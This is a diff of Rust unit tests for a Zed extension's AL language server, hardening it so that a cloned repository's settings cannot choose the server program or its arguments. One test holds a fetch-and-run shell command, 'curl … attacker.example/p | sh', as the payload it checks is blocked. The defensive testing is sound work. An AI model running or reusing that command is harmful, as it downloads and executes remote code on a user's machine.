@@ -135,7 +135,7 @@ fn moderate_depth_key_nests_normally() {
 #[test]
 fn resolve_server_args_defaults_to_stdio() {
     assert_eq!(
-        crate::settings::resolve_server_args(None, None),
+        crate::settings::resolve_server_args(None),
         vec!["--stdio".to_string()]
     );
 }
@@ -148,25 +148,72 @@ fn resolve_server_args_honors_use_official_lsp_in_all_shapes() {
         serde_json::json!({"al": {"useOfficialLsp": true}}),
     ] {
         assert_eq!(
-            crate::settings::resolve_server_args(None, Some(&shape)),
+            crate::settings::resolve_server_args(Some(&shape)),
             vec!["--official-lsp".to_string()],
             "shape: {shape}"
         );
     }
     let off = serde_json::json!({"al": {"useOfficialLsp": false}});
     assert_eq!(
-        crate::settings::resolve_server_args(None, Some(&off)),
+        crate::settings::resolve_server_args(Some(&off)),
         vec!["--stdio".to_string()]
     );
 }
 
+/// The decision the extension hands Zed, not the helper that informs it.
+///
+/// `LspSettings::for_worktree` merges the worktree's `.zed/settings.json` into
+/// the user's own and gives the extension no provenance, so a `binary` block
+/// arriving here may be one a cloned repository wrote. The block names a
+/// program and its command line, which together are the payload.
 #[test]
-fn resolve_server_args_explicit_arguments_override_everything() {
-    let s = serde_json::json!({"useOfficialLsp": true});
+fn settings_cannot_choose_the_language_server_program_or_its_arguments() {
+    use crate::settings::resolve_server_launch;
+
+    let arguments = [
+        "-c".to_string(),
+        "curl -s https://attacker.example/p | sh".to_string(),
+    ];
+    let launch = resolve_server_launch(Some("/bin/sh"), Some(&arguments), None);
+
     assert_eq!(
-        crate::settings::resolve_server_args(Some(vec!["--custom".into()]), Some(&s)),
-        vec!["--custom".to_string()]
+        launch.program, None,
+        "a settings-supplied program must not reach find_or_download_binary"
     );
+    assert_eq!(launch.args, vec!["--stdio".to_string()]);
+    for arg in &launch.args {
+        assert!(
+            !arguments.contains(arg),
+            "a settings-supplied argument reached the command line: {arg}"
+        );
+    }
+}
+
+/// A program the machine already has is refused on the same rule as one the
+/// clone carried. The residency of the path is not what decides.
+#[test]
+fn an_absolute_program_outside_the_worktree_is_refused_too() {
+    use crate::settings::resolve_server_launch;
+
+    for program in ["/usr/bin/dotnet", "/opt/al-lsp/al-lsp", "/bin/sh"] {
+        assert_eq!(
+            resolve_server_launch(Some(program), None, None).program,
+            None,
+            "{program} must not be taken from settings"
+        );
+    }
+}
+
+/// Ignoring the binary block does not cost the one argument switch the
+/// extension does support.
+#[test]
+fn the_official_lsp_toggle_still_chooses_the_arguments() {
+    use crate::settings::resolve_server_launch;
+
+    let settings = serde_json::json!({"al": {"useOfficialLsp": true}});
+    let launch = resolve_server_launch(Some("/bin/sh"), Some(&["-c".to_string()]), Some(&settings));
+    assert_eq!(launch.args, vec!["--official-lsp".to_string()]);
+    assert_eq!(launch.program, None);
 }
 
 #[test]
@@ -228,13 +275,18 @@ fn resolve_dotnet_path_honors_all_settings_shapes() {
     );
 }
 
+/// What the helper answers about `dotnetPath`, which is the only setting it
+/// still filters. It is not an authorisation: a false answer says the program
+/// is not a file the clone carried, and leaves every program the machine
+/// already has. The program the language server runs is decided by
+/// `resolve_server_launch`, which is tested above.
 #[test]
-fn a_program_path_inside_the_worktree_is_refused() {
+fn a_dotnet_path_inside_the_worktree_is_refused() {
     use crate::settings::is_worktree_resident_program;
 
     let root = "/home/me/src/SomeApp";
-    // The attack in the finding: a cloned repository ships the binary and
-    // names it from its own `.zed/settings.json`.
+    // A cloned repository ships the program and names it from its own
+    // `.zed/settings.json`.
     assert!(is_worktree_resident_program("./tools/al-lsp", root));
     assert!(is_worktree_resident_program("tools/dotnet", root));
     assert!(is_worktree_resident_program(
@@ -246,6 +298,10 @@ fn a_program_path_inside_the_worktree_is_refused() {
         root
     ));
 
+    // A dotnet host the machine already has is not a file the clone carried.
+    // al-lsp refuses this one too when the project is untrusted, because it
+    // can read the repository's settings files and the extension cannot
+    // (`trust::enforce_dotnet_path`).
     assert!(!is_worktree_resident_program("/usr/bin/dotnet", root));
     assert!(!is_worktree_resident_program("/opt/al-lsp/al-lsp", root));
     // A sibling directory whose name starts with the root must not be caught
